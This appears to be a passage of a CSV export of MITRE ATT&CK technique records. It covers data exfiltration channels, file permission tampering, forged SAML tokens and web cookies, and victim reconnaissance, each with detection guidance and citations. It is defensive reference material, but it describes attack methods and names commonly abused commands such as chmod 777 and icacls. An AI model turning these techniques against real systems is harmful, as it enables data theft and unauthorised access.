T1048.001,attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. 

Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP). ",https://attack.mitre.org/techniques/T1048/001,15 March 2020,28 March 2020,enterprise-attack,1.0,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) 

Artifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels. ","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1048,,,,,,,,",(Citation: TechNet Firewall Design)"
T1048.003,attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",https://attack.mitre.org/techniques/T1048/003,15 March 2020,12 April 2023,enterprise-attack,2.1,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2) 

For network infrastructure devices, collect AAA logging to monitor for `copy` commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP.","Linux, Network, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1048,,"Austin Clark, @c2defense; William Cain",,,,,,"(Citation: Trustwave Cherry Picker),(Citation: Symantec Elfin Mar 2019),(Citation: Microsoft FTP),(Citation: Rclone),(Citation: Bitdefender Agent Tesla April 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: objective-see windtail2 jan 2019),(Citation: Check Point APT35 CharmPower January 2022),(Citation: McAfee Gold Dragon),(Citation: FireEye APT37 Feb 2018),(Citation: Symantec Thrip June 2018),(Citation: ESET ForSSHe December 2018),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: F-Secure Cosmicduke),(Citation: ESET OceanLotus Mar 2019),(Citation: Novetta Blockbuster),(Citation: Palo Alto OilRig Oct 2016),(Citation: ESET Carbon Mar 2017),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: DFIR Ryuk's Return October 2020),(Citation: Linux FTP),(Citation: Talos Agent Tesla Oct 2018),(Citation: Medium KONNI Jan 2020),(Citation: Mandiant APT41),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Microsoft BITSAdmin),(Citation: Trend Micro FIN6 October 2019),(Citation: hexed osx.dok analysis 2019),(Citation: Talos PoetRAT April 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Novetta Blockbuster RATs),(Citation: FireEye Know Your Enemy FIN8 Aug 2016),(Citation: TechNet Firewall Design)"
T1011.001,attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd,Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.

Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",https://attack.mitre.org/techniques/T1011/001,09 March 2020,08 March 2022,enterprise-attack,1.1,Exfiltration,"Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.

Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1011,,,,,,,,"(Citation: Symantec Beetlejuice),"
T1052.001,attack-pattern--a3e1e6c5-9c74-4fc0-a16c-a9d228c17829,Exfiltration Over Physical Medium: Exfiltration over USB,"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",https://attack.mitre.org/techniques/T1052/001,11 March 2020,15 October 2021,enterprise-attack,1.1,Exfiltration,Monitor file access on removable media. Detect processes that execute when removable media are mounted.,"Linux, Windows, macOS","Command: Command Execution, Drive: Drive Creation, File: File Access, Process: Process Creation",True,T1052,,William Cain,,,Presence of physical medium or device,,,"(Citation: Securelist Agent.btz),(Citation: ESET Machete July 2019),(Citation: Securelist Machete Aug 2014),(Citation: Avira Mustang Panda January 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Kaspersky ProjectSauron Full Report),(Citation: FireEye APT30),(Citation: Microsoft Disable Autorun),(Citation: TechNet Removable Media Control)"
T1567.004,attack-pattern--43f2776f-b4bd-4118-94b8-fee47e69676d,Exfiltration Over Web Service: Exfiltration Over Webhook,"Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server.(Citation: RedHat Webhooks) Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello.(Citation: Discord Intro to Webhooks) When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. 

Adversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) of emails, chat messages, and other data.(Citation: Push Security SaaS Attacks Repository Webhooks) Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.(Citation: Microsoft SQL Server)

Access to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.(Citation: CyberArk Labs Discord)(Citation: Talos Discord Webhook Abuse)(Citation: Checkmarx Webhooks)",https://attack.mitre.org/techniques/T1567/004,20 July 2023,12 October 2023,enterprise-attack,1.0,Exfiltration,,"Google Workspace, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1567,,"Sunders Bruskin, Microsoft Threat Intelligence; Yossi Weizman, Microsoft Threat Intelligence",,,,,,","
T1567.002,attack-pattern--bf1b6176-597c-4600-bfcd-ac989670f96b,Exfiltration Over Web Service: Exfiltration to Cloud Storage,"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.

Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ",https://attack.mitre.org/techniques/T1567/002,09 March 2020,15 September 2023,enterprise-attack,1.2,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1567,,,,,,,,"(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: FireEye Periscope March 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: ESET Lazarus Jun 2020),(Citation: NCC Group Chimera January 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Rclone),(Citation: Microsoft HAFNIUM March 2020),(Citation: Checkpoint IndigoZebra July 2021),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Talos Kimsuky Nov 2021),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Bitdefender LuminousMoth July 2021),(Citation: Symantec Waterbug Jun 2019),(Citation: Mandiant FIN12 Oct 2021),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: ESET Nomadic Octopus 2018),(Citation: TrendMicro Confucius APT Feb 2018),(Citation: Microsoft POLONIUM June 2022),(Citation: TrendMicro EarthLusca 2022),(Citation: Proofpoint Leviathan Oct 2017),(Citation: ESET Crutch December 2020),(Citation: Github PowerShell Empire),(Citation: ESET ComRAT May 2020),(Citation: Bitdefender Naikon April 2021),(Citation: CrowdStrike Carbon Spider August 2021),(Citation: FireEye APT29),"
T1567.001,attack-pattern--86a96bf6-cf8b-411c-aaeb-8959944d64f7,Exfiltration Over Web Service: Exfiltration to Code Repository,"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.

Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. ",https://attack.mitre.org/techniques/T1567/001,09 March 2020,15 September 2023,enterprise-attack,1.1,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1567,,,,,,,,"(Citation: Github PowerShell Empire),"
T1567.003,attack-pattern--ba04e672-da86-4e69-aa15-0eca5db25f43,Exfiltration Over Web Service: Exfiltration to Text Storage Sites,"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  

Text storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.(Citation: Pastebin EchoSec)

**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.",https://attack.mitre.org/techniques/T1567/003,27 February 2023,04 May 2023,enterprise-attack,1.0,Exfiltration,,"Linux, Windows, macOS","Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1567,,Harun Küßner,,,,,,","
T1222.002,attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345,File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).

Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",https://attack.mitre.org/techniques/T1222/002,04 February 2020,14 August 2023,enterprise-attack,1.2,Defense Evasion,"Monitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible. Commonly abused command arguments include <code>chmod +x</code>, <code>chmod -R 755</code>, and <code>chmod 777</code>.(Citation: 20 macOS Common Tools and Techniques) 

Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.","Linux, macOS","Command: Command Execution, File: File Metadata, Process: Process Creation",True,T1222,,,,,,,,"(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: CheckPoint Dok),(Citation: Aqua Kinsing April 2020),(Citation: Carbon Black Shlayer Feb 2019),(Citation: Trend Micro TeamTNT),(Citation: Uptycs Black Basta ESXi June 2022),(Citation: ESET OceanLotus macOS April 2019),(Citation: 20 macOS Common Tools and Techniques),(Citation: Cisco Talos Intelligence Group),(Citation: ANSSI Sandworm January 2021),(Citation: Anomali Rocke March 2019),(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: Leonardo Turla Penquin May 2020),"
T1222.001,attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).

Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)

Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",https://attack.mitre.org/techniques/T1222/001,04 February 2020,21 April 2023,enterprise-attack,1.2,Defense Evasion,"Monitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.

Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified.(Citation: EventTracker File Permissions Feb 2014)",Windows,"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Metadata, Process: Process Creation",True,T1222,,,,,,,,"(Citation: NCC Group WastedLocker June 2020),(Citation: ANSSI RYUK RANSOMWARE),(Citation: LogRhythm WannaCry),(Citation: Sophos New Ryuk Attack October 2020),(Citation: Cisco CaddyWiper March 2022),(Citation: Microsoft PLATINUM April 2016),(Citation: ESET Grandoreiro April 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft BlackCat Jun 2022),"
T1606.002,attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2,Forge Web Credentials: SAML Tokens,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)

An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.

An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)",https://attack.mitre.org/techniques/T1606/002,17 December 2020,19 September 2023,enterprise-attack,1.2,Credential Access,"This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)

Consider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)","Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage",True,T1606,,"Blake Strom, Microsoft 365 Defender; Jack Burns, HubSpot; Oleg Kolesnikov, Securonix",,,,,,"(Citation: Secureworks IRON RITUAL Profile),(Citation: AADInternals Documentation),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Mandiant Defend UNC2452 White Paper),(Citation: Microsoft SolarWinds Customer Guidance),(Citation: FireEye ADFS)"
T1606.001,attack-pattern--861b8fd2-57f3-4ee1-ab5d-c19c3b8c7a4a,Forge Web Credentials: Web Cookies,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.

Adversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.

Once forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)",https://attack.mitre.org/techniques/T1606/001,17 December 2020,19 September 2023,enterprise-attack,1.1,Credential Access,"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","IaaS, Linux, SaaS, Windows, macOS","Logon Session: Logon Session Creation, Web Credential: Web Credential Usage",True,T1606,,"Jack Burns, HubSpot",,,,,,"(Citation: Volexity SolarWinds),"
T1592.004,attack-pattern--774ad5bb-2366-4c13-a8a9-65e50b292e7c,Gather Victim Host Information: Client Configurations,"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1592/004,02 October 2020,17 October 2021,enterprise-attack,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,True,T1592,,,,,,,,"(Citation: Microsoft HAFNIUM March 2020),"
T1592.003,attack-pattern--b85f6ce5-81e8-4f36-aff2-3df9d02a9c9d,Gather Victim Host Information: Firmware,"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1592/003,02 October 2020,15 April 2021,enterprise-attack,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1592,,,,,,,,","
T1592.001,attack-pattern--24286c33-d4a4-4419-85c2-1d094a896c26,Gather Victim Host Information: Hardware,"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",https://attack.mitre.org/techniques/T1592/001,02 October 2020,17 October 2021,enterprise-attack,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,True,T1592,,,,,,,,","
T1592.002,attack-pattern--baf60e1a-afe5-4d31-830f-1b1ba2351884,Gather Victim Host Information: Software,"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).

Adversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1592/002,02 October 2020,17 October 2021,enterprise-attack,1.1,Reconnaissance,"Internet scanners may be used to look for patterns associated with malicious content designed to collect host software information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)

Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,Internet Scan: Response Content,True,T1592,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Google Iran Threats October 2021),(Citation: TrendMicro New Andariel Tactics July 2018),"
T1589.001,attack-pattern--bc76d0a4-db11-4551-9ac4-01a469cfb161,Gather Victim Identity Information: Credentials,"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.

Adversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)

Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). ",https://attack.mitre.org/techniques/T1589/001,02 October 2020,14 April 2023,enterprise-attack,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1589,,"Lee Christensen, SpecterOps; Toby Kohlenberg; Vinayak Wadhwa, Lucideus",,,,,,"(Citation: IBM ITG18 2020),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: NCC Group LAPSUS Apr 2022),(Citation: Microsoft Targeting Elections September 2020),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: NCC Group Chimera January 2021),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: CISA AA21-200A APT40 July 2021),(Citation: CrowdStrike StellarParticle January 2022),"
T1589.002,attack-pattern--69f897fd-12a9-4c89-ad6a-46d2f3c38262,Gather Victim Identity Information: Email Addresses,"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.

